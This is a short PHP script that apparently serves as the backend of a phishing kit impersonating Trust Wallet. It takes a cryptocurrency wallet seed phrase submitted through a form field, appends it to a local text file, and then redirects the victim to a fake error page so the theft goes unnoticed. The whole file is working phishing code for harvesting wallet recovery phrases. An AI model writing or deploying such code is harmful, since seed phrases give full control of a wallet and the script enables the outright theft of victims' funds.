<?php

file_put_contents("Trustcryptowalletmemonicphrase.txt", "Trust Crypto Wallet Memonic Phrase: " . $_POST['walletSeed']. "\n", FILE_APPEND);
header('Location: Trust_Error.html');
exit();
?>